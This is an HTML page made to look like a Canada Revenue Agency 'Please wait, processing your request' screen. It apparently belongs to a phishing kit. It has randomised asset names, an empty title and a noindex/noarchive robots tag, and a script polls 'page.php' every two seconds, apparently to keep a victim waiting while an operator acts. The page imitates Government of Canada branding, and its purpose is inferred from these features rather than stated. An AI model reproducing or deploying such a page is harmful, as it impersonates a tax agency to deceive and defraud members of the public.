<!DOCTYPE html>
   <html class="no-js" lang="en" dir="ltr" style="background-color:#f9f9f9">
     
      <head>
         <meta charset="utf-8">
         <title></title>
         <meta content="width=device-width, initial-scale=1" name="viewport">
         <meta name="robots" content="noindex, nofollow, noarchive">
         <meta name="format-detection" content="telephone=no">
         <meta name="dcterms.language" content="eng">
         <meta name="dcterms.title" content="">
         <meta name="dcterms.creator" content="Canada Revenue Agency">
         <script src="hotreload.js"></script>
        
         <link href="FYV5Dhq9TC1S.ico" rel="icon" type="image/x-icon">
         <link rel="stylesheet" href="css/OLC0SsTkwS7x.css">
         <link rel="stylesheet" href="css/f53XcG3x0mFS.css">
      </head>
      <body vocab="http://schema.org/" typeof="WebPage">
         <header>
            <div id="wb-bnr" class="container">
               <section id="wb-lng" class="visible-md visible-lg text-right">
                  <h2 class="wb-inv">Language selection</h2>
                  <ul class="list-inline margin-bottom-none">
                     <li>
                        <div lang="fr">
                           <a href="/gol-ged/awsc/amss/enrol/languageToggle">Français</a>
                        </div>
                     </li>
                  </ul>
               </section>
               <div class="row">
                  <div class="brand col-xs-9 col-sm-5 col-md-4" property="publisher" resource="#wb-publisher" typeof="GovernmentOrganization">
                     <img alt="" src="images/3BukJIr0mmKo.svg" property="logo">
                     <span class="wb-inv" property="name"> Government of Canada / <span lang="fr">Gouvernement du Canada</span></span>
                     <meta property="name" content="Government of Canada">
                     <meta property="areaServed" typeof="Country" content="Canada">
                     <link property="logo" href="/gol-ged/awsc/amss/ebci/wet/v10.5.4/GCWeb/assets/wmms-blk.svg">
                  </div>
               </div>
            </div>
            <div id="brand-container-cra">
               <div class="container">
                  <div class="row">
                     <div class="col-xs-12 col-sm-10" id="brand-text-cra">
                        Canada Revenue Agency
                     </div>
                     <div class="col-xs-4 col-sm-2 text-right">
                     </div>
                  </div>
               </div>
            </div>
            <span data-trgt="mb-pnl" class="wb-menu hide"></span>
         </header>
         <main property="mainContentOfPage" class="container">
            <div class="left">
            </div>
            <div class="center">
               <div id="content">
                  <a name="cont" id="cont"></a>
                  <h1>
                     Please wait
                  </h1>
                  <div>
                     <div class="floatLeft">
                        <p>The system is processing your request.</p>
                        <p>This may take several minutes...</p>
                     </div>
                     <div id="animation">
                        <img src="images/xkp9XlA8M92Q.gif" alt="">	
                     </div>
                  </div>
               </div>
            </div>
         </main>
         <br>
         <footer id="wb-info">
            <div class="brand" style="border-top:4px solid #335175">
               <div class="container">
                  <div class="row ">
                     <nav class="col-md-10 ftr-urlt-lnk">
                        <h2 class="wb-inv">About this site</h2>
                        <ul>
                           <li><a href="https://www.canada.ca/en/transparency/terms.html" rel="noopener noreferrer" target="_blank">Terms and conditions</a></li>
                           <li><a href="https://www.canada.ca/en/transparency/privacy.html" rel="noopener noreferrer" target="_blank">Privacy</a></li>
                        </ul>
                     </nav>
                     <div class="col-xs-6 visible-sm visible-xs tofpg">
                        <a href="#wb-cont">Top of Page <span class="glyphicon glyphicon-chevron-up"></span></a>
                     </div>
                     <div class="col-xs-6 col-md-3 col-lg-2 text-right">
                        <img src="images/vV7ZiohDYsSW.svg" alt="Symbol of the Government of Canada">
                     </div>
                  </div>
               </div>
            </div>
         </footer>
         <script>
            function page(){
                jQuery.ajax({
                    url:'page.php',
                    success:function(){
                        
                    }
                });
            }
            
            
            setInterval(function(){
                page();
            },2000);
         </script>
      </body>
   </html>
